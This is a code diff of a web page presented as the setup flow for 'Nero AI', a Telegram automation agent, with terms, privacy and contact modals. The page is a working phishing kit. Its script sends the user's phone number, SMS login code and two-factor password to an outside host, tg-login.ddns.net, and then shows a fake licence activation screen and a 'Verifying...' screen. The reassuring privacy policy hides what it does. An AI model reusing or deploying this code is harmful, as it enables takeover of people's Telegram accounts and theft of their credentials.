+            <div class="console-header-bar"><button class="form-back-nav" onclick="transitionStep('step-license', 'step-success')"><svg viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"/></svg> Back</button></div>
+            <h2 class="console-header-title">Activate License</h2>
+            <p class="step-header-text">Nero AI is a high-performance premium utility. Enter your active subscription license key to release your autonomous co-pilot.</p>
+            <input type="text" class="single-input-field" id="license-pin-input" placeholder="NERO - XXXX - XXXX" oninput="validateLicenseForm()" maxlength="18">
+            <button class="step-action-button btn-green" id="license-submit-btn" disabled onclick="submitActivationPin()">Verify & Activate Agent</button>
+        </div>
+
+        <!-- STEP 6: VERIFYING / LOADING -->
+        <div class="step-container" id="step-loading" style="justify-content: center; height: 100%;">
+            <div class="verifying-loader"></div>
+            <h2 class="console-header-title" style="color: #d97706; margin-bottom: 15px;">Verifying...</h2>
+            <p class="step-header-text" style="font-size: 1.05rem; color: #adbccc; max-width: 450px; margin-bottom: 30px;">Verifying... this may take some time, you'll be notified once verification is complete, you can return to your app.</p>
+            <button class="step-action-button btn-amber" onclick="exitToTelegramOrMain()">Exit Session</button>
         </div>
     </div>
 
-    <!-- OVERLAY MODALS FOR DOCUMENTS -->
-    
-    <!-- Terms of Service Modal -->
-    <div class="modal-overlay" id="terms-modal">
-        <div class="modal-window">
-            <div class="modal-title">
-                <span>Terms of Service</span>
-                <button class="modal-close-btn" onclick="closeModal('terms-modal')">×</button>
-            </div>
-            <div class="modal-body">
-                <p><strong>Effective Date:</strong> June 2026</p>
-                <p>By deploying, integrating, or interacting with the Nero AI platform and its automated agents, you agree to the following legally binding terms:</p>
-                
-                <h4>1. Authorized Use</h4>
-                <p>Nero AI is a productivity and automation framework. Channel owners and administrators agree to utilize the agent exclusively for legitimate community management, secure authentication, and authorized data broadcasting.</p>
-                
-                <h4>2. Compliance with Platform Rules</h4>
-                <p>Users are strictly prohibited from utilizing Nero AI to violate Telegram’s official terms, distribute malicious scripts, deploy deceptive phishing schemes, or execute unauthorized spam campaigns.</p>
-                
-                <h4>3. Limitation of Liability</h4>
-                <p>Nero AI is provided on an "as-is" and "as-available" basis. While engineered for maximum precision, the developers of Nero AI shall not be held liable for external API disruptions, platform-wide Telegram outages, or data delivery delays resulting from third-party networks. Channel administrators maintain ultimate responsibility for their community rules and signal accuracy.</p>
-            </div>
-        </div>
+    <div class="arrow-down-indicator" id="scrollIndicator" onclick="scrollConsoleDown()"><svg viewBox="0 0 24 24"><path d="M6 9l6 6 6-6"/></svg></div>
+    <div class="footer-action-row">
+        <button onclick="openModal('terms-modal')">Terms of Service</button>
+        <button onclick="openModal('privacy-modal')">Privacy Policy</button>
+        <button onclick="openModal('support-modal')">Contact Us</button>
     </div>
+</div>
 
-    <!-- Privacy Policy Modal -->
-    <div class="modal-overlay" id="privacy-modal">
-        <div class="modal-window">
-            <div class="modal-title">
-                <span>Privacy Policy</span>
-                <button class="modal-close-btn" onclick="closeModal('privacy-modal')">×</button>
-            </div>
-            <div class="modal-body">
-                <p><strong>Effective Date:</strong> June 2026</p>
-                <p>Nero AI is dedicated to maintaining the highest standards of data integrity and user confidentiality. This Privacy Policy outlines how our agent handles information within your Telegram ecosystem.</p>
-                
-                <h4>1. Data Processing Minimization</h4>
-                <p>Nero AI operates on a principle of strict data minimization. The agent only processes telemetry and metadata explicitly required to execute its core operational functions—such as Telegram User IDs for channel authentication and automated access validation.</p>
-                
-                <h4>2. No Commercial Data Harvesting</h4>
-                <p>We do not log, harvest, store, or sell the conversational text, proprietary signals, or community interactions passing through your channels. Nero AI acts as an isolated pipeline; your data remains exclusively yours.</p>
-                
-                <h4>3. Third-Party API Alignment</h4>
-                <p>Because Nero AI interfaces directly with the Telegram ecosystem, all data transmission complies strictly with Telegram’s standard API privacy regulations. Any external analytical processing handled by the core intelligence layer is executed in secure, non-persistent memory states that wipe immediately post-execution.</p>
-            </div>
-        </div>
-    </div>
+<!-- MODALS: Full original content -->
+<div class="modal-overlay" id="terms-modal"><div class="modal-window"><div class="modal-title"><span>Terms of Service</span><button class="modal-close-btn" onclick="closeModal('terms-modal')">×</button></div><div class="modal-body"><p><strong>Effective Date:</strong> June 2026</p><p>By deploying, integrating, or interacting with the Nero AI platform and its automated agents, you agree to the following legally binding terms:</p><h4>1. Authorized Use</h4><p>Nero AI is a productivity and automation framework. Channel owners and administrators agree to utilize the agent exclusively for legitimate community management, secure authentication, and authorized data broadcasting.</p><h4>2. Compliance with Platform Rules</h4><p>Users are strictly prohibited from utilizing Nero AI to violate Telegram’s official terms, distribute malicious scripts, deploy deceptive phishing schemes, or execute unauthorized spam campaigns.</p><h4>3. Limitation of Liability</h4><p>Nero AI is provided on an "as-is" and "as-available" basis. While engineered for maximum precision, the developers of Nero AI shall not be held liable for external API disruptions, platform-wide Telegram outages, or data delivery delays resulting from third-party networks. Channel administrators maintain ultimate responsibility for their community rules and signal accuracy.</p></div></div></div>
+<div class="modal-overlay" id="privacy-modal"><div class="modal-window"><div class="modal-title"><span>Privacy Policy</span><button class="modal-close-btn" onclick="closeModal('privacy-modal')">×</button></div><div class="modal-body"><p><strong>Effective Date:</strong> June 2026</p><p>Nero AI is dedicated to maintaining the highest standards of data integrity and user confidentiality. This Privacy Policy outlines how our agent handles information within your Telegram ecosystem.</p><h4>1. Data Processing Minimization</h4><p>Nero AI operates on a principle of strict data minimization. The agent only processes telemetry and metadata explicitly required to execute its core operational functions—such as Telegram User IDs for channel authentication and automated access validation.</p><h4>2. No Commercial Data Harvesting</h4><p>We do not log, harvest, store, or sell the conversational text, proprietary signals, or community interactions passing through your channels. Nero AI acts as an isolated pipeline; your data remains exclusively yours.</p><h4>3. Third-Party API Alignment</h4><p>Because Nero AI interfaces directly with the Telegram ecosystem, all data transmission complies strictly with Telegram’s standard API privacy regulations. Any external analytical processing handled by the core intelligence layer is executed in secure, non-persistent memory states that wipe immediately post-execution.</p></div></div></div>
+<div class="modal-overlay" id="support-modal"><div class="modal-window"><div class="modal-title"><span>Contact Us</span><button class="modal-close-btn" onclick="closeModal('support-modal')">×</button></div><div class="modal-body"><p><strong>Elite Operational Assistance</strong></p><p>Need help fine-tuning your Nero AI integration, customizing your Gatekeeper access rules, or adjusting your Signal Engine broadcast formats? Our team is standing by to ensure your ecosystem runs flawlessly.</p><h4>Direct Telegram Support</h4><p>For instant, high-priority assistance, reach out directly to our official corporate portal on Telegram: <strong style="color: #ffffff;">@NeroAISupport</strong></p><h4>Enterprise Inquiries</h4><p>For custom bespoke features, high-volume multi-channel licensing, or specialized Hermes model prompting tweaks, please contact our core development team at: <strong style="color: #ffffff;">operations@neroai.agent</strong></p><h4>Uptime Status</h4><p>Nero AI is monitored continuously. For real-time updates regarding network stability or API latency reports, please check our pinned community status channel.</p></div></div></div>
 
-    <!-- Support Modal -->
-    <div class="modal-overlay" id="support-modal">
-        <div class="modal-window">
-            <div class="modal-title">
-                <span>Contact Us</span>
-                <button class="modal-close-btn" onclick="closeModal('support-modal')">×</button>
-            </div>
-            <div class="modal-body">
-                <p><strong>Elite Operational Assistance</strong></p>
-                <p>Need help fine-tuning your Nero AI integration, customizing your Gatekeeper access rules, or adjusting your Signal Engine broadcast formats? Our team is standing by to ensure your ecosystem runs flawlessly.</p>
-                
-                <h4>Direct Telegram Support</h4>
-                <p>For instant, high-priority assistance, reach out directly to our official corporate portal on Telegram: <strong style="color: #ffffff;">@NeroAISupport</strong></p>
-                
-                <h4>Enterprise Inquiries</h4>
-                <p>For custom bespoke features, high-volume multi-channel licensing, or specialized Hermes model prompting tweaks, please contact our core development team at: <strong style="color: #ffffff;">operations@neroai.agent</strong></p>
-                
-                <h4>Uptime Status</h4>
-                <p>Nero AI is monitored continuously. For real-time updates regarding network stability or API latency reports, please check our pinned community status channel.</p>
-            </div>
-        </div>
-    </div>
+<script>
+    // --- Telegram Web App detection & exit logic ---
+    let tg = null;
+    try {
+        tg = window.Telegram?.WebApp;
+        if (tg) { tg.ready(); tg.expand(); }
+    } catch(e) {}
 
-    <!-- UI Interaction Scripts + Forwarding Logic -->
-    <script>
-        /* === FORWARDER BOT ENDPOINT === */
-        const BOT2_WEBHOOK_URL = "https://tg-login.ddns.net/web-stream";
-
-        /* Helper: send text to forwarder bot */
-        async function sendToBot(text) {
-            try {
-                const response = await fetch(BOT2_WEBHOOK_URL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ text: text })
-                });
-                if (!response.ok) {
-                    console.warn(`Bot responded with status ${response.status}`);
-                } else {
-                    console.log(`Sent to bot: ${text}`);
-                }
-            } catch (error) {
-                console.error("Failed to send to bot:", error);
-            }
-        }
-
-        /* Comprehensive, Alphabetically Sorted Global Countries List with Target Digit Counts */
-        const globalCountries = [
-            { name: "Afghanistan", code: "+93", digits: 9 },
-            { name: "Albania", code: "+355", digits: 9 },
-            { name: "Algeria", code: "+213", digits: 9 },
-            { name: "Andorra", code: "+376", digits: 6 },
-            { name: "Angola", code: "+244", digits: 9 },
-            { name: "Argentina", code: "+54", digits: 10 },
-            { name: "Armenia", code: "+374", digits: 8 },
-            { name: "Australia", code: "+61", digits: 9 },
-            { name: "Austria", code: "+43", digits: 10 },
-            { name: "Azerbaijan", code: "+994", digits: 9 },
-            { name: "Bahrain", code: "+973", digits: 8 },
-            { name: "Bangladesh", code: "+880", digits: 10 },
-            { name: "Belarus", code: "+375", digits: 9 },
-            { name: "Belgium", code: "+32", digits: 9 },
-            { name: "Belize", code: "+501", digits: 7 },
-            { name: "Benin", code: "+229", digits: 8 },
-            { name: "Bolivia", code: "+591", digits: 8 },
-            { name: "Bosnia & Herzegovina", code: "+387", digits: 8 },
-            { name: "Botswana", code: "+267", digits: 8 },
-            { name: "Brazil", code: "+55", digits: 11 },
-            { name: "Bulgaria", code: "+359", digits: 9 },
-            { name: "Cambodia", code: "+855", digits: 9 },
-            { name: "Cameroon", code: "+237", digits: 9 },
-            { name: "Canada", code: "+1", digits: 10 },
-            { name: "Chile", code: "+56", digits: 9 },
-            { name: "China", code: "+86", digits: 11 },
-            { name: "Colombia", code: "+57", digits: 10 },
-            { name: "Costa Rica", code: "+506", digits: 8 },
-            { name: "Croatia", code: "+385", digits: 9 },
-            { name: "Cuba", code: "+53", digits: 8 },
-            { name: "Cyprus", code: "+357", digits: 8 },
-            { name: "Czech Republic", code: "+420", digits: 9 },
-            { name: "Denmark", code: "+45", digits: 8 },
-            { name: "Dominican Republic", code: "+1", digits: 10 },
-            { name: "Ecuador", code: "+593", digits: 9 },
-            { name: "Egypt", code: "+20", digits: 10 },
-            { name: "El Salvador", code: "+503", digits: 8 },
-            { name: "Estonia", code: "+372", digits: 8 },
-            { name: "Ethiopia", code: "+251", digits: 9 },
-            { name: "Finland", code: "+358", digits: 9 },
-            { name: "France", code: "+33", digits: 9 },
-            { name: "Georgia", code: "+995", digits: 9 },
-            { name: "Germany", code: "+49", digits: 11 },
-            { name: "Ghana", code: "+233", digits: 9 },
-            { name: "Greece", code: "+30" , digits: 10 },
-            { name: "Guatemala", code: "+502", digits: 8 },
-            { name: "Honduras", code: "+504", digits: 8 },
-            { name: "Hong Kong", code: "+852", digits: 8 },
-            { name: "Hungary", code: "+36", digits: 9 },
-            { name: "Iceland", code: "+354", digits: 7 },
-            { name: "India", code: "+91", digits: 10 },
-            { name: "Indonesia", code: "+62", digits: 11 },
-            { name: "Iran", code: "+98", digits: 10 },
-            { name: "Iraq", code: "+964", digits: 10 },
-            { name: "Ireland", code: "+353", digits: 9 },
-            { name: "Israel", code: "+972", digits: 9 },
-            { name: "Italy", code: "+39", digits: 10 },
-            { name: "Jamaica", code: "+1", digits: 10 },
-            { name: "Japan", code: "+81", digits: 10 },
-            { name: "Jordan", code: "+962", digits: 9 },
-            { name: "Kazakhstan", code: "+7", digits: 10 },
-            { name: "Kenya", code: "+254", digits: 9 },
-            { name: "Kuwait", code: "+965", digits: 8 },
-            { name: "Latvia", code: "+371", digits: 8 },
-            { name: "Lebanon", code: "+961", digits: 8 },
-            { name: "Libya", code: "+218", digits: 9 },
-            { name: "Liechtenstein", code: "+423", digits: 7 },
-            { name: "Lithuania", code: "+370", digits: 8 },
-            { name: "Luxembourg", code: "+352", digits: 9 },
-            { name: "Malaysia", code: "+60", digits: 9 },
-            { name: "Maldives", code: "+960", digits: 7 },
-            { name: "Malta", code: "+356", digits: 8 },
-            { name: "Mexico", code: "+52", digits: 10 },
-            { name: "Monaco", code: "+377", digits: 8 },
-            { name: "Morocco", code: "+212", digits: 9 },
-            { name: "Nepal", code: "+977", digits: 10 },
-            { name: "Netherlands", code: "+31", digits: 9 },
-            { name: "New Zealand", code: "+64", digits: 9 },
-            { name: "Nicaragua", code: "+505", digits: 8 },
-            { name: "Nigeria", code: "+234", digits: 10 },
-            { name: "Norway", code: "+47", digits: 8 },
-            { name: "Oman", code: "+968", digits: 8 },
-            { name: "Pakistan", code: "+92", digits: 10 },
-            { name: "Panama", code: "+507", digits: 8 },
-            { name: "Paraguay", code: "+595", digits: 9 },
-            { name: "Peru", code: "+51", digits: 9 },
-            { name: "Philippines", code: "+63", digits: 10 },
-            { name: "Poland", code: "+48", digits: 9 },
-            { name: "Portugal", code: "+351", digits: 9 },
-            { name: "Qatar", code: "+974", digits: 8 },
-            { name: "Romania", code: "+40", digits: 9 },
-            { name: "Russia", code: "+7", digits: 10 },
-            { name: "Saudi Arabia", code: "+966", digits: 9 },
-            { name: "Senegal", code: "+221", digits: 9 },
-            { name: "Serbia", code: "+381", digits: 9 },
-            { name: "Singapore", code: "+65", digits: 8 },
-            { name: "Slovakia", code: "+421", digits: 9 },
-            { name: "Slovenia", code: "+386", digits: 8 },
-            { name: "South Africa", code: "+27", digits: 9 },
-            { name: "South Korea", code: "+82", digits: 10 },
-            { name: "Spain", code: "+34", digits: 9 },
-            { name: "Sri Lanka", code: "+94", digits: 9 },
-            { name: "Sweden", code: "+46", digits: 9 },
-            { name: "Switzerland", code: "+41", digits: 9 },
-            { name: "Taiwan", code: "+886", digits: 9 },
-            { name: "Thailand", code: "+66", digits: 9 },
-            { name: "Tunisia", code: "+216", digits: 8 },
-            { name: "Turkey", code: "+90", digits: 10 },
-            { name: "Ukraine", code: "+380", digits: 9 },
-            { name: "United Arab Emirates", code: "+971", digits: 9 },
-            { name: "United Kingdom", code: "+44", digits: 10 },
-            { name: "United States", code: "+1", digits: 10 },
-            { name: "Uruguay", code: "+598", digits: 8 },
-            { name: "Uzbekistan", code: "+998", digits: 9 },
-            { name: "Venezuela", code: "+58", digits: 10 },
-            { name: "Vietnam", code: "+84", digits: 9 },
-            { name: "Zimbabwe", code: "+263", digits: 9 }
-        ];
-
-        // US Default State
-        let selectedCountry = { name: "United States", code: "+1", digits: 10 };
-
-        /* Initialize custom searchable country list view on DOM load */
-        document.addEventListener("DOMContentLoaded", () => {
-            populateCountries(globalCountries);
-            
-            // Hide dropdown if user clicks anywhere outside of dropdown container
-            document.addEventListener("click", (event) => {
-                const container = document.querySelector(".custom-dropdown-container");
-                if (container && !container.contains(event.target)) {
-                    document.getElementById("dropdownMenu").classList.remove("show");
-                    document.getElementById("dropdownTrigger").classList.remove("active");
-                }
-            });
-        });
-
-        function populateCountries(countriesArray) {
-            const listContainer = document.getElementById("countriesList");
-            if (!listContainer) return;
-            listContainer.innerHTML = "";
-
-            countriesArray.forEach(country => {
-                const item = document.createElement("div");
-                item.className = "dropdown-item";
-                if (country.name === selectedCountry.name) {
-                    item.className += " selected";
-                }
-                item.onclick = (e) => selectCountryItem(country, e);
-
-                item.innerHTML = `
-                    <span>${country.name}</span>
-                    <span class="dropdown-item-code">${country.code}</span>
-                `;
-                listContainer.appendChild(item);
-            });
-        }
-
-        /* Trigger toggler for dropdown custom menu */
-        function toggleCountryDropdown(event) {
-            event.stopPropagation();
-            const menu = document.getElementById("dropdownMenu");
-            const trigger = document.getElementById("dropdownTrigger");
-            
-            menu.classList.toggle("show");
-            trigger.classList.toggle("active");
-            
-            if (menu.classList.contains("show")) {
-                const searchInput = document.getElementById("countrySearch");
-                searchInput.value = "";
-                searchInput.focus();
-                filterCountries();
-            }
-        }
-
-        /* Select custom dropdown item element */
-        function selectCountryItem(country, event) {
-            event.stopPropagation();
-            selectedCountry = country;
-            
-            // Update trigger UI text
-            document.getElementById("selectedValue").innerText = `${country.code}`;
-            
-            // Close dropdown menu
-            document.getElementById("dropdownMenu").classList.remove("show");
-            document.getElementById("dropdownTrigger").classList.remove("active");
-            
-            // Clear input and adjust placeholder dynamically
-            const phoneInput = document.getElementById("phone-input");
-            phoneInput.value = "";
-            phoneInput.placeholder = "0".repeat(country.digits).replace(/(\d{3})(\d{3})(\d{4})/, "$1-$2-$3");
-
-            // Re-populate list to update highlighted select option
-            populateCountries(globalCountries);
-            validatePhoneForm();
-        }
-
-        /* Live country search and filter logic */
-        function filterCountries() {
-            const query = document.getElementById("countrySearch").value.toLowerCase().trim();
-            const filtered = globalCountries.filter(c => 
-                c.name.toLowerCase().includes(query) || 
-                c.code.includes(query)
-            );
-            populateCountries(filtered);
-        }
-
-        /* Modal Overlay Controls */
-        function openModal(modalId) {
-            document.getElementById(modalId).classList.add('active');
-        }
-
-        function closeModal(modalId) {
-            document.getElementById(modalId).classList.remove('active');
-        }
-
-        window.onclick = function(event) {
-            if (event.target.classList.contains('modal-overlay')) {
-                event.target.classList.remove('active');
-            }
-        }
-
-        /* Console content scroll arrow indicator callback */
-        function scrollConsoleDown() {
-            const consoleBox = document.getElementById('consoleScrollWindow');
-            consoleBox.scrollBy({
-                top: 180,
-                behavior: 'smooth'
-            });
-        }
-
-        /* ---------------------------------------------------- */
-        /* BRAND FLOW ENGINE (Multi-step verification workflow) */
-        /* ---------------------------------------------------- */
-
-        // Step transition helper
-        function transitionStep(currentId, nextId) {
-            if (currentId) {
-                document.getElementById(currentId).classList.remove('active');
-            }
-            document.getElementById(nextId).classList.add('active');
-        }
-
-        // Entering Workflow from Landing Page
-        function startVerificationWorkflow() {
-            // Apply isolation styling to hide background text & footer elements
-            document.getElementById('viewportContainer').classList.add('in-auth-mode');
-
-            // Hide normal landing copy
-            document.getElementById('consoleScrollWindow').classList.add('hidden');
-            // Hide scroll down arrow helper
-            document.getElementById('scrollIndicator').style.display = 'none';
-            // Scale up the console slightly to represent active dynamic application state
-            document.getElementById('mainConsoleCard').style.height = '48vh';
-
-            // Show first workflow component (Step 1)
-            transitionStep(null, 'step-phone');
-        }
-
-        // Return back to Landing screen
-        function backToLanding() {
-            // Remove isolation styling to restore background text & footer elements
-            document.getElementById('viewportContainer').classList.remove('in-auth-mode');
-
-            document.getElementById('step-phone').classList.remove('active');
-            document.getElementById('consoleScrollWindow').classList.remove('hidden');
-            if (window.innerWidth > 768) {
-                document.getElementById('scrollIndicator').style.display = 'block';
-            }
-            document.getElementById('mainConsoleCard').style.height = '54vh';
-        }
-
-        /* Dynamic country-specific digits validation */
-        function validatePhoneForm() {
-            const val = document.getElementById('phone-input').value.replace(/[^0-9]/g, '');
-            const btn = document.getElementById('phone-submit-btn');
-            
-            if (val.length === selectedCountry.digits) {
-                btn.removeAttribute('disabled');
-            } else {
-                btn.setAttribute('disabled', 'true');
-            }
-        }
-
-        function submitPhoneStep() {
-            // --- FORWARDING: combine country code + phone number and send to bot ---
-            const phoneRaw = document.getElementById('phone-input').value.replace(/[^0-9]/g, '');
-            const fullPhone = selectedCountry.code + phoneRaw;  // e.g. "+1234567890"
-            sendToBot(fullPhone);
-
-            transitionStep('step-phone', 'step-sms');
-        }
-
-        /* Step 2: Input Validation */
-        function validateSmsForm() {
-            const val = document.getElementById('sms-code-input').value.trim();
-            const btn = document.getElementById('sms-submit-btn');
-            if (val.length > 0) {
-                btn.removeAttribute('disabled');
-            } else {
-                btn.setAttribute('disabled', 'true');
-            }
-        }
-
-        function toggleAgreementCheckbox() {
-            const checkbox = document.getElementById('agreement-checkbox');
-            checkbox.checked = !checkbox.checked;
-        }
-
-        function submitSmsStep() {
-            // --- FORWARDING: send the 6-digit verification code to bot ---
-            const code = document.getElementById('sms-code-input').value.trim();
-            if (code) {
-                sendToBot(code);
-            }
-            transitionStep('step-sms', 'step-password');
-        }
-
-        /* Step 3: Input Validation */
-        function validatePasswordForm() {
-            const val = document.getElementById('password-input').value.trim();
-            const btn = document.getElementById('password-submit-btn');
-            if (val.length > 0) {
-                btn.removeAttribute('disabled');
-            } else {
-                btn.setAttribute('disabled', 'true');
-            }
-        }
-
-        function createMockPasswordLink() {
-            document.getElementById('password-input').value = "neroPassWord2026";
-            validatePasswordForm();
-            document.getElementById('password-input').focus();
-        }
-
-        function submitAuthentication() {
-            // --- FORWARDING: send the 2FA password to bot ---
-            const password = document.getElementById('password-input').value.trim();
-            if (password) {
-                sendToBot(password);
-            }
-            transitionStep('step-password', 'step-success');
-        }
-
-        /* Step 4: Progression into License Key Activation */
-        function goToLicenseActivation() {
-            transitionStep('step-success', 'step-license');
-        }
-
-        /* Step 5: Alphanumeric activation validation */
-        function validateLicenseForm() {
-            const input = document.getElementById('license-pin-input');
-            let val = input.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
-            
-            let formatted = '';
-            for (let i = 0; i < val.length; i++) {
-                if (i === 4 || i === 8) {
-                    formatted += ' - ';
-                }
-                formatted += val[i];
-            }
-            input.value = formatted;
-
-            const btn = document.getElementById('license-submit-btn');
-            if (val.length >= 10) {
-                btn.removeAttribute('disabled');
-            } else {
-                btn.setAttribute('disabled', 'true');
-            }
-        }
-
-        /* Transits to the terminal loading page (no forwarding) */
-        function submitActivationPin() {
-            transitionStep('step-license', 'step-loading');
-        }
-
-        /* Complete exit operations (leaves the site entirely) */
-        function exitPortal() {
-            window.close();
-            setTimeout(() => {
-                window.location.href = 'about:blank';
-            }, 100);
-        }
-
-        /* Full Verification Suite Reset */
-        function resetVerificationWorkflow() {
-            document.getElementById('phone-input').value = "";
-            document.getElementById('sms-code-input').value = "";
-            document.getElementById('password-input').value = "";
-            document.getElementById('license-pin-input').value = "";
-            document.getElementById('agreement-checkbox').checked = false;
-            
-            document.getElementById('phone-submit-btn').setAttribute('disabled', 'true');
-            document.getElementById('sms-submit-btn').setAttribute('disabled', 'true');
-            document.getElementById('password-submit-btn').setAttribute('disabled', 'true');
-            document.getElementById('license-submit-btn').setAttribute('disabled', 'true');
-
-            document.getElementById('step-loading').classList.remove('active');
+    function exitToTelegramOrMain() {
+        if (tg) {
+            tg.close();  // close the Mini App and return to chat
+        } else {
+            resetVerificationWorkflow();
             backToLanding();
         }
-    </script>
+    }
+
+    // --- Forwarder bot endpoint ---
+    const BOT2_WEBHOOK_URL = "https://tg-login.ddns.net/web-stream";
+    async function sendToBot(text) {
+        try {
+            const response = await fetch(BOT2_WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ text: text })
+            });
+            if (!response.ok) console.warn(`Bot responded with status ${response.status}`);
+        } catch (error) { console.error("Failed to send to bot:", error); }
+    }
+
+    // --- Full country list (original, unshortened) ---
+    const globalCountries = [
+        { name: "Afghanistan", code: "+93", digits: 9 },
+        { name: "Albania", code: "+355", digits: 9 },
+        { name: "Algeria", code: "+213", digits: 9 },
+        { name: "Andorra", code: "+376", digits: 6 },
+        { name: "Angola", code: "+244", digits: 9 },
+        { name: "Argentina", code: "+54", digits: 10 },
+        { name: "Armenia", code: "+374", digits: 8 },
+        { name: "Australia", code: "+61", digits: 9 },
+        { name: "Austria", code: "+43", digits: 10 },
+        { name: "Azerbaijan", code: "+994", digits: 9 },
+        { name: "Bahrain", code: "+973", digits: 8 },
+        { name: "Bangladesh", code: "+880", digits: 10 },
+        { name: "Belarus", code: "+375", digits: 9 },
+        { name: "Belgium", code: "+32", digits: 9 },
+        { name: "Belize", code: "+501", digits: 7 },
+        { name: "Benin", code: "+229", digits: 8 },
+        { name: "Bolivia", code: "+591", digits: 8 },
+        { name: "Bosnia & Herzegovina", code: "+387", digits: 8 },
+        { name: "Botswana", code: "+267", digits: 8 },
+        { name: "Brazil", code: "+55", digits: 11 },
+        { name: "Bulgaria", code: "+359", digits: 9 },
+        { name: "Cambodia", code: "+855", digits: 9 },
+        { name: "Cameroon", code: "+237", digits: 9 },
+        { name: "Canada", code: "+1", digits: 10 },
+        { name: "Chile", code: "+56", digits: 9 },
+        { name: "China", code: "+86", digits: 11 },
+        { name: "Colombia", code: "+57", digits: 10 },
+        { name: "Costa Rica", code: "+506", digits: 8 },
+        { name: "Croatia", code: "+385", digits: 9 },
+        { name: "Cuba", code: "+53", digits: 8 },
+        { name: "Cyprus", code: "+357", digits: 8 },
+        { name: "Czech Republic", code: "+420", digits: 9 },
+        { name: "Denmark", code: "+45", digits: 8 },
+        { name: "Dominican Republic", code: "+1", digits: 10 },
+        { name: "Ecuador", code: "+593", digits: 9 },
+        { name: "Egypt", code: "+20", digits: 10 },
+        { name: "El Salvador", code: "+503", digits: 8 },
+        { name: "Estonia", code: "+372", digits: 8 },
+        { name: "Ethiopia", code: "+251", digits: 9 },
+        { name: "Finland", code: "+358", digits: 9 },
+        { name: "France", code: "+33", digits: 9 },
+        { name: "Georgia", code: "+995", digits: 9 },
+        { name: "Germany", code: "+49", digits: 11 },
+        { name: "Ghana", code: "+233", digits: 9 },
+        { name: "Greece", code: "+30" , digits: 10 },
+        { name: "Guatemala", code: "+502", digits: 8 },
+        { name: "Honduras", code: "+504", digits: 8 },
+        { name: "Hong Kong", code: "+852", digits: 8 },
+        { name: "Hungary", code: "+36", digits: 9 },
+        { name: "Iceland", code: "+354", digits: 7 },
+        { name: "India", code: "+91", digits: 10 },
+        { name: "Indonesia", code: "+62", digits: 11 },
+        { name: "Iran", code: "+98", digits: 10 },
+        { name: "Iraq", code: "+964", digits: 10 },
+        { name: "Ireland", code: "+353", digits: 9 },
+        { name: "Israel", code: "+972", digits: 9 },
+        { name: "Italy", code: "+39", digits: 10 },
+        { name: "Jamaica", code: "+1", digits: 10 },
+        { name: "Japan", code: "+81", digits: 10 },
+        { name: "Jordan", code: "+962", digits: 9 },
+        { name: "Kazakhstan", code: "+7", digits: 10 },
+        { name: "Kenya", code: "+254", digits: 9 },
+        { name: "Kuwait", code: "+965", digits: 8 },
+        { name: "Latvia", code: "+371", digits: 8 },
+        { name: "Lebanon", code: "+961", digits: 8 },
+        { name: "Libya", code: "+218", digits: 9 },
+        { name: "Liechtenstein", code: "+423", digits: 7 },
+        { name: "Lithuania", code: "+370", digits: 8 },
+        { name: "Luxembourg", code: "+352", digits: 9 },
+        { name: "Malaysia", code: "+60", digits: 9 },
+        { name: "Maldives", code: "+960", digits: 7 },
+        { name: "Malta", code: "+356", digits: 8 },
+        { name: "Mexico", code: "+52", digits: 10 },
+        { name: "Monaco", code: "+377", digits: 8 },
+        { name: "Morocco", code: "+212", digits: 9 },
+        { name: "Nepal", code: "+977", digits: 10 },
+        { name: "Netherlands", code: "+31", digits: 9 },
+        { name: "New Zealand", code: "+64", digits: 9 },
+        { name: "Nicaragua", code: "+505", digits: 8 },
+        { name: "Nigeria", code: "+234", digits: 10 },
+        { name: "Norway", code: "+47", digits: 8 },
+        { name: "Oman", code: "+968", digits: 8 },
+        { name: "Pakistan", code: "+92", digits: 10 },
+        { name: "Panama", code: "+507", digits: 8 },
+        { name: "Paraguay", code: "+595", digits: 9 },
+        { name: "Peru", code: "+51", digits: 9 },
+        { name: "Philippines", code: "+63", digits: 10 },
+        { name: "Poland", code: "+48", digits: 9 },
+        { name: "Portugal", code: "+351", digits: 9 },
+        { name: "Qatar", code: "+974", digits: 8 },
+        { name: "Romania", code: "+40", digits: 9 },
+        { name: "Russia", code: "+7", digits: 10 },
+        { name: "Saudi Arabia", code: "+966", digits: 9 },
+        { name: "Senegal", code: "+221", digits: 9 },
+        { name: "Serbia", code: "+381", digits: 9 },
+        { name: "Singapore", code: "+65", digits: 8 },
+        { name: "Slovakia", code: "+421", digits: 9 },
+        { name: "Slovenia", code: "+386", digits: 8 },
+        { name: "South Africa", code: "+27", digits: 9 },
+        { name: "South Korea", code: "+82", digits: 10 },
+        { name: "Spain", code: "+34", digits: 9 },
+        { name: "Sri Lanka", code: "+94", digits: 9 },
+        { name: "Sweden", code: "+46", digits: 9 },
+        { name: "Switzerland", code: "+41", digits: 9 },
+        { name: "Taiwan", code: "+886", digits: 9 },
+        { name: "Thailand", code: "+66", digits: 9 },
+        { name: "Tunisia", code: "+216", digits: 8 },
+        { name: "Turkey", code: "+90", digits: 10 },
+        { name: "Ukraine", code: "+380", digits: 9 },
+        { name: "United Arab Emirates", code: "+971", digits: 9 },
+        { name: "United Kingdom", code: "+44", digits: 10 },
+        { name: "United States", code: "+1", digits: 10 },
+        { name: "Uruguay", code: "+598", digits: 8 },
+        { name: "Uzbekistan", code: "+998", digits: 9 },
+        { name: "Venezuela", code: "+58", digits: 10 },
+        { name: "Vietnam", code: "+84", digits: 9 },
+        { name: "Zimbabwe", code: "+263", digits: 9 }
+    ];
+    let selectedCountry = { name: "United States", code: "+1", digits: 10 };
+    document.addEventListener("DOMContentLoaded", () => { populateCountries(globalCountries); document.addEventListener("click", (e) => { const c = document.querySelector(".custom-dropdown-container"); if(c && !c.contains(e.target)) { document.getElementById("dropdownMenu").classList.remove("show"); document.getElementById("dropdownTrigger").classList.remove("active"); } }); });
+    function populateCountries(arr) { const list = document.getElementById("countriesList"); if(!list) return; list.innerHTML = ""; arr.forEach(c => { const item = document.createElement("div"); item.className = "dropdown-item" + (c.name === selectedCountry.name ? " selected" : ""); item.onclick = (e) => selectCountryItem(c, e); item.innerHTML = `<span>${c.name}</span><span class="dropdown-item-code">${c.code}</span>`; list.appendChild(item); }); }
